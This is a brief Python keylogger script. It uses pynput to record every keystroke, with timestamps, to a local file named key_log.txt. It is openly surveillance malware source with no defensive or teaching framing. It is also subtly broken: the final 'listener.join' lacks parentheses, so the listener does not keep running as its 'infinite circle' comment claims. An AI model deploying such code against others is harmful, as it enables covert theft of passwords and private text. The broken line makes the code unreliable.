import logging
import os
from pynput.keyboard import Listener

log_Directory = os.getcwd() + '/' # where file saves
print(os.getcwd()) # directory

# create file
logging.basicConfig(filename=(log_Directory + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)
    # on press key saved to file

with Listener(on_press=on_press) as listener:
    listener.join # infinite circle
